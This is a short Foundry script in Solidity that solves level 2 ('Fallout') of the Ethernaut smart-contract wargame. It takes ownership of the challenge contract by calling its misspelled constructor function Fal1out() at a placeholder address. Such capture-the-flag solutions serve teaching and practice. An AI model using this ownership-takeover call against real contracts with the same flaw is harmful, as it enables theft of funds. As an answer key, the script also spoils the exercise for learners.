// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/02_Fallout.sol";

contract ExploitScript is Script {
    Fallout level2 = Fallout(payable(your_challenge_address));

    function run() public {
        vm.startBroadcast();

        level2.Fal1out();

        vm.stopBroadcast();
    }   
}

